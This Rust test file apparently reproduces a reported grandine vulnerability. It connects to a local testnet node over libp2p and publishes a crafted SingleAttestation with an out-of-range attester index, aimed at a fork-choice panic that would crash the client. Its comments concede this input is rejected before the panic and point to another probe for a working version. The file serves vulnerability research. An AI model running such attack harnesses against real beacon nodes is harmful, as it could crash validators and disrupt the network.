// Live libp2p reproduction of grandine CHK-QW-02.
//
// SingleAttestation with an out-of-band attester_index (a validator appended
// after the justified checkpoint) -> unguarded justified_active_balances[index]
// -> fork-choice panic (index out of bounds).
//
// This test reuses grandine's eth2_libp2p stack to:
//   1. dial the Kurtosis grandine node,
//   2. complete Status,
//   3. join the beacon_attestation_{subnet_id} mesh,
//   4. publish a SingleAttestation with attester_index = 0xFFFFFFFF.
//
// KNOWN LIMITATION: 0xFFFFFFFF + a zeroed signature cannot reach the panic --
// grandine verifies the BLS signature (public_key(state, attester_index)?)
// BEFORE the fork-choice mutator, so a non-existent index is rejected at the
// pubkey lookup. A faithful live reproduction needs a real validator deposited
// after the justified checkpoint (index in [justified_len, target_len)) plus a
// valid signature under the attacker's key. For a deterministic in-process
// reproduction that satisfies these preconditions, see
// probes/grandine_singleattestation_gap_index.{patch,py}.
//
// Required env:
//   GR_CFG=/tmp/grandine-netcfg
//   GR_TARGET=/ip4/127.0.0.1/tcp/<port>/p2p/<peer_id>
//
// Optional env:
//   GR_ATTESTER_INDEX=4294967295  (0xFFFFFFFF)
//   GR_SUBNET_ID=0
//   GR_WARMUP=12

#![allow(unused)]

use std::sync::Arc;
use std::time::{Duration, Instant};

use eth2_libp2p::rpc::methods::{StatusMessage, StatusMessageV2};
use eth2_libp2p::rpc::RequestType;
use eth2_libp2p::service::api_types::AppRequestId;
use eth2_libp2p::types::{
    GossipEncoding, GossipKind, GossipTopic, PubsubMessage,
};
use eth2_libp2p::{Multiaddr, NetworkEvent, Response};
use types::combined::SignedBeaconBlock as CombinedSignedBeaconBlock;
use types::config::Config;
use types::electra::containers::SingleAttestation;
use types::phase0::containers::{AttestationData, Checkpoint};
use types::phase0::primitives::{H256, SubnetId};
use types::preset::Mainnet;
use types::traits::SignedBeaconBlock as _;
use types::traits::BeaconBlockBody as _;
use ssz::SszHash as _;

type P = Mainnet;

fn env_u64(key: &str, default: u64) -> u64 {
    std::env::var(key)
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(default)
}

fn load_config() -> Arc<Config> {
    let dir = std::env::var("GR_CFG").expect("GR_CFG=/path/to/network-configs");
    let bytes = std::fs::read(format!("{dir}/config.yaml")).expect("read config.yaml");
    let config: Config = serde_yaml::from_slice(&bytes).expect("parse config.yaml");
    Arc::new(config)
}

fn genesis_validators_root() -> H256 {
    let dir = std::env::var("GR_CFG").expect("GR_CFG=/path/to/network-configs");
    let s = std::fs::read_to_string(format!("{dir}/genesis_validators_root.txt"))
        .expect("read genesis_validators_root.txt");
    s.trim()
        .trim_start_matches("0x")
        .parse()
        .expect("gvr hex")
}

fn react(
    attacker: &mut crate::common::Libp2pInstance<P>,
    ev: &NetworkEvent<P>,
    cached: &mut Option<StatusMessage>,
    sent_status: &mut bool,
    block_template: &mut Option<Arc<CombinedSignedBeaconBlock<P>>>,
    attestation_data: &mut Option<AttestationData>,
) {
    match ev {
        NetworkEvent::RequestReceived {
            peer_id,
            inbound_request_id,
            request_type,
        } => {
            if let RequestType::Status(their) = request_type {
                eprintln!("[hs] <- Status from grandine: {their:?}");
                attacker.send_response(*peer_id, *inbound_request_id, Response::Status(their.clone()));
                *cached = Some(their.clone());
                if !*sent_status {
                    let _ = attacker.send_request(
                        *peer_id,
                        AppRequestId::Application(1),
                        RequestType::Status(their.clone()),
                    );
                    *sent_status = true;
                    eprintln!("[hs] -> reciprocated Status");
                }
            }
        }
        NetworkEvent::StatusPeer(peer_id) => {
            if let Some(status) = cached.clone() {
                let _ = attacker.send_request(
                    *peer_id,
                    AppRequestId::Application(1),
                    RequestType::Status(status),
                );
                *sent_status = true;
                eprintln!("[hs] -> Status (on StatusPeer)");
            }
        }
        NetworkEvent::PeerDisconnected(peer_id) => {
            eprintln!("[hs] !! grandine disconnected us: {peer_id}");
        }
        NetworkEvent::PubsubMessage { topic, source, message, .. } => {
            match message {
                PubsubMessage::BeaconBlock(block) => {
                    *block_template = Some(block.clone());
                    // Also try to extract AttestationData from the block's
                    // attestations field — this is the most reliable source of
                    // valid AttestationData with correct source/target checkpoints.
                    if attestation_data.is_none() {
                        for att in block.message().body().combined_attestations() {
                            let data = att.data();
                            eprintln!(
                                "[gossip] extracted AttestationData from block: slot={} index={}",
                                data.slot, data.index
                            );
                            *attestation_data = Some(data);
                            break;
                        }
                    }
                }
                PubsubMessage::Attestation(_subnet, att) => {
                    // Capture attestation data from a live un-aggregated attestation.
                    *attestation_data = Some(att.data());
                    eprintln!("[gossip] captured AttestationData from {source}");
                }
                _ => {}
            }
            eprintln!("[gossip] <- {topic:?} from {source}");
        }
        _ => {}
    }
}

/// Build a crafted SingleAttestation with an out-of-band attester_index.
///
/// We reuse a real AttestationData observed on gossip, then set attester_index
/// to a value beyond the justified state's validator registry.
///
/// NOTE: with attester_index = 0xFFFFFFFF and a zeroed signature this is
/// rejected at the pubkey lookup during signature validation, BEFORE the
/// fork-choice mutator -- it does not panic. Reaching justified_active_balances
/// requires a real gap-index validator and a valid signature; see the
/// gap_index reproduction for the correct construction.
fn craft_single_attestation(
    data: AttestationData,
    oob_index: u64,
    committee_index: u64,
) -> SingleAttestation {
    SingleAttestation {
        committee_index,
        attester_index: oob_index,
        data,
        signature: Default::default(),
    }
}

#[tokio::test]
#[ignore]
async fn publish_oob_singleattestation() {
    let config = load_config();
    let gvr = genesis_validators_root();
    let oob_index = env_u64("GR_ATTESTER_INDEX", 0xFFFF_FFFF);
    let subnet_id_u64: SubnetId = env_u64("GR_SUBNET_ID", 0);
    let warmup_secs = env_u64("GR_WARMUP", 12);

    // Compute fork digests for diagnostics.
    for (name, epoch) in [
        ("genesis", 0u64),
        ("fulu", config.fulu_fork_epoch),
        ("electra", config.electra_fork_epoch),
    ] {
        let digest = helper_functions::misc::compute_fork_digest(&config, gvr, epoch);
        eprintln!("[digest] {name}@{epoch} = {digest:?}");
    }

    let mut attacker = crate::common::build_attacker_instance::<P>(&config, gvr).await;
    let target: Multiaddr = std::env::var("GR_TARGET")
        .expect("GR_TARGET=/ip4/127.0.0.1/tcp/<port>/p2p/<peer_id>")
        .parse()
        .expect("valid multiaddr");
    attacker.testing_dial(target).expect("dial target");

    let mut cached: Option<StatusMessage> = None;
    let mut sent_status = false;
    let mut block_template: Option<Arc<CombinedSignedBeaconBlock<P>>> = None;
    let mut attestation_data: Option<AttestationData> = None;

    let peer_id = loop {
        let ev = attacker.next_event().await;
        react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut block_template, &mut attestation_data);
        if let NetworkEvent::PeerConnectedOutgoing(peer_id) = ev {
            break peer_id;
        }
    };
    eprintln!("[*] connected to {peer_id}; subscribing to beacon_block");

    // Subscribe to beacon_block first. We'll subscribe to the correct
    // attestation subnet once we extract AttestationData from a block.
    attacker.subscribe_kind(GossipKind::BeaconBlock);

    // Send proactive Status to establish the session.
    let status = StatusMessage::V2(StatusMessageV2 {
        fork_digest: helper_functions::misc::compute_fork_digest(
            &config,
            gvr,
            config.fulu_fork_epoch,
        ),
        finalized_root: H256::zero(),
        finalized_epoch: 0,
        head_root: H256::zero(),
        head_slot: 0,
        earliest_available_slot: 0,
    });
    let _ = attacker.send_request(
        peer_id,
        AppRequestId::Application(1),
        RequestType::Status(status.clone()),
    );
    cached = Some(status);
    sent_status = true;
    eprintln!("[hs] -> proactive Status sent to {peer_id}");

    // Phase 1 warmup: wait for block mesh and extract AttestationData from a block.
    let warmup = Instant::now();
    let block_topic = GossipTopic::new(
        GossipKind::BeaconBlock,
        GossipEncoding::default(),
        helper_functions::misc::compute_fork_digest(&config, gvr, config.fulu_fork_epoch),
    );
    let block_topic_hash = libp2p::gossipsub::IdentTopic::from(block_topic.clone()).hash();

    while warmup.elapsed() < Duration::from_secs(warmup_secs) {
        if let Ok(ev) =
            tokio::time::timeout(Duration::from_millis(100), attacker.next_event()).await
        {
            react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut block_template, &mut attestation_data);
        }
        let block_mesh = attacker.gossipsub().mesh_peers(&block_topic_hash).count();
        if block_mesh > 0 && attestation_data.is_some() {
            break;
        }
    }

    // Now subscribe to the subnet that matches the captured AttestationData.
    // The Python probe passes committees_per_slot via env. We compute the
    // correct subnet from the AttestationData extracted from blocks, then
    // wait for mesh to form. If no mesh forms within 30s, we try a fresher
    // block (different slot → different subnet).
    let committees_per_slot: u64 = std::env::var("GR_COMMITTEES_PER_SLOT")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(1);

    let mut data = attestation_data.unwrap_or_else(|| {
        eprintln!("[!] no attestation data captured from blocks; using subnet from env");
        let block = block_template
            .as_ref()
            .expect("need a block template to synthesize attestation data");
        let block_slot = block.message().slot();
        let block_root = block.message().hash_tree_root();
        AttestationData {
            slot: block_slot,
            index: 0,
            beacon_block_root: block_root,
            source: Checkpoint {
                epoch: 0,
                root: H256::zero(),
            },
            target: Checkpoint {
                epoch: 0,
                root: block_root,
            },
        }
    });

    // Loop: try different subnets (from different block slots) until mesh forms.
    let mesh_deadline = Instant::now() + Duration::from_secs(180);
    let mut max_att_mesh = 0usize;
    let mut actual_subnet = subnet_id_u64;
    let mut subscribed_subnet: Option<SubnetId> = None;

    while Instant::now() < mesh_deadline {
        // Compute the correct subnet from the latest AttestationData.
        let computed_subnet = helper_functions::misc::compute_subnet_for_attestation::<P>(
            committees_per_slot,
            data.slot,
            data.index,
        )
        .expect("compute subnet for attestation");

        // (Re)subscribe if the subnet changed.
        if subscribed_subnet != Some(computed_subnet) {
            if subscribed_subnet.is_some() {
                eprintln!(
                    "[!] switching subnet {} -> {} (data.slot={})",
                    subscribed_subnet.unwrap(),
                    computed_subnet,
                    data.slot
                );
            } else {
                eprintln!(
                    "[*] subscribing to attestation subnet {} (data.slot={}, data.index={})",
                    computed_subnet, data.slot, data.index
                );
            }
            attacker.subscribe_kind(GossipKind::Attestation(computed_subnet));
            let att_topic = GossipTopic::new(
                GossipKind::Attestation(computed_subnet),
                GossipEncoding::default(),
                helper_functions::misc::compute_fork_digest(&config, gvr, config.fulu_fork_epoch),
            );
            let att_topic_hash = libp2p::gossipsub::IdentTopic::from(att_topic.clone()).hash();
            subscribed_subnet = Some(computed_subnet);
            actual_subnet = computed_subnet;
            max_att_mesh = 0;

            // Wait for mesh on this subnet (up to 30s).
            let sub_deadline = Instant::now() + Duration::from_secs(30);
            while Instant::now() < sub_deadline {
                if let Ok(ev) =
                    tokio::time::timeout(Duration::from_millis(100), attacker.next_event()).await
                {
                    react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut block_template, &mut attestation_data);
                }
                max_att_mesh = max_att_mesh.max(attacker.gossipsub().mesh_peers(&att_topic_hash).count());
                // Update data if we got a fresher AttestationData.
                if let Some(fresh) = attestation_data {
                    if fresh.slot > data.slot {
                        data = fresh;
                    }
                }
                if max_att_mesh > 0 {
                    break;
                }
            }
        }

        if max_att_mesh > 0 {
            break;
        }

        // No mesh: wait for a fresher block to get a different subnet.
        eprintln!("[!] no mesh on subnet {actual_subnet}; waiting for a fresher block");
        let wait_deadline = Instant::now() + Duration::from_secs(15);
        while Instant::now() < wait_deadline {
            if let Ok(ev) =
                tokio::time::timeout(Duration::from_millis(100), attacker.next_event()).await
            {
                react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut block_template, &mut attestation_data);
            }
            if let Some(fresh) = attestation_data {
                if fresh.slot > data.slot {
                    data = fresh;
                    break;
                }
            }
        }
    }

    let max_block_mesh = attacker.gossipsub().mesh_peers(&block_topic_hash).count();
    eprintln!(
        "[*] warmup done (status_sent={sent_status}, cached={}, block_mesh={max_block_mesh}, att_mesh={max_att_mesh}, subnet={actual_subnet}, att_data=slot:{},index:{})",
        cached.is_some(),
        data.slot,
        data.index,
    );

    // Use the latest attestation_data if we got a fresh one during mesh wait.
    let data = attestation_data.unwrap_or(data);

    // Craft the malicious SingleAttestation with OOB attester_index.
    let committee_index = data.index;
    let malicious = craft_single_attestation(data, oob_index, committee_index);
    eprintln!(
        "[attack] publishing SingleAttestation: attester_index={oob_index} (0x{oob_index:X}), committee_index={committee_index}, subnet={actual_subnet}"
    );

    // Publish on the beacon_attestation_{subnet_id} topic.
    attacker.publish(PubsubMessage::SingleAttestation(actual_subnet, malicious));

    // Drain events for 30 seconds to let the message propagate and the panic fire.
    eprintln!("[attack] published; draining 30s for propagation + panic");
    let drain = Instant::now();
    while drain.elapsed() < Duration::from_secs(30) {
        if let Ok(ev) =
            tokio::time::timeout(Duration::from_millis(100), attacker.next_event()).await
        {
            eprintln!("[drain-ev] {ev:?}");
            react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut block_template, &mut attestation_data);
        }
    }

    eprintln!("[attack] done");
}